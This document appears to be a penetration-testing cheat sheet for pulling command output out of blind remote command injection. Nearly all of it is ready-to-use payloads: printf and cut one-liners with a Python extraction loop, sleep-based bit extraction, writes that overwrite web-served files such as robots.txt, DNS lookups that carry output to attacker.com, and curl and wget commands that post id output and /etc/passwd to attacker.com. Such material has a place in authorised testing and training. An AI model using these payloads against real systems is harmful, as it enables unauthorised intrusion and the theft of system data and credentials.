# Blind RCE Exfiltration Techniques

## When to Use
- Command injection confirmed (time-based delay proves execution)
- Output NOT reflected in HTTP response
- No outbound connectivity for reverse shell
- Read-only webroot (can't write webshell)

## Technique 1: IP-Format Encoding (printf trick)

When the app only displays output matching IP regex (X.X.X.X format):

```bash
# Single char as last octet (ASCII value)
;printf "1.1.1.%d" "'$(whoami|cut -c1)"
# Returns: IP Address: 1.1.1.119  (119 = 'w')

# Loop client-side, 1 request per char:
for i in range(1, max_len+1):
    payload = f';printf "1.1.1.%d" "\'$(CMD|cut -c{i})"'
    # Parse last octet, chr() it, append to output
    # Stop when octet = 0 (null = end of string)
```

**Python exfil template:**
```python
def exfil(cmd, max_len=80):
    output = ""
    for i in range(1, max_len + 1):
        payload = ';printf "1.1.1.%d" "\'$(' + cmd + '|cut -c' + str(i) + ')"'
        r = inject(payload)
        if "IP Address:" in r:
            val = int(r.replace("IP Address:", "").strip().split(".")[-1])
            if val == 0:
                break
            output += chr(val)
        else:
            break
    return output
```

## Technique 2: Time-Based Byte Extraction

When NO output is reflected at all:

```bash
# Extract one bit at a time via sleep
# If char at position N has bit B set, sleep 1
;if [ $(echo -n "$(whoami)" | cut -c1 | od -An -tu1 | awk '{print and($1,128)}') -ne 0 ]; then sleep 1; fi
```

Faster approach — sleep proportional to char value:
```bash
# Sleep for (ascii_value / 50) seconds — coarse but fast
;sleep $(echo -n "$(whoami|cut -c1)" | od -An -tu1 | awk '{printf "%.1f", $1/100}')
```

## Technique 3: File Write + Alternative Read Path

```bash
# Write to /tmp, read via LFI/SSRF/another vuln
;id > /tmp/exfil.txt

# Write to accessible static dir (if writable)
;id > /var/www/html/static/out.txt

# Write to upload directory
;id > /var/www/uploads/out.txt

# Overwrite existing accessible file
;id > /var/www/html/robots.txt
```

## Technique 4: DNS Exfiltration (requires external listener)

```bash
# Encode output as subdomain label
;nslookup $(whoami).attacker.com
;dig $(cat /etc/hostname).attacker.com

# For longer output, chunk into labels (max 63 chars per label)
;dig $(id|base64|cut -c1-60).attacker.com
```

## Technique 5: curl/wget Out-of-Band

```bash
# POST output to listener
;curl http://attacker.com/exfil -d "$(id)"
;wget --post-data="$(cat /etc/passwd)" http://attacker.com/exfil

# GET with output in URL
;curl "http://attacker.com/$(whoami)"
```

## Technique 6: Error-Based Extraction

Some apps display command errors differently:
```bash
# Force DNS error with output as hostname
;host "$(whoami).invalid"
# Error message may contain: "Host $(whoami).invalid not found"

# Force file error
;cat "/tmp/$(whoami)"
# Error: "No such file: /tmp/www-data"
```

## Speed Optimization

| Method | Speed | Requires |
|--------|-------|----------|
| File write + read | Fast (1 req) | Writable accessible path |
| OOB curl/DNS | Fast (1 req) | Outbound connectivity |
| IP-octet printf | Slow (1 req/char) | App shows IP output |
| Time-based | Very slow (1 req/bit) | Nothing — always works |

**Priority order:** File write → OOB → IP-encoding → Time-based

## Pitfalls
- `cut -c` is 1-indexed, not 0-indexed
- Null byte (val=0) means end of output, not a literal char
- URL-encode special chars in payloads (+, &, ;, space)
- Some shells treat `'` differently — test with backtick alternative
- base64 output contains +/= which break URL params — use base32 or tr
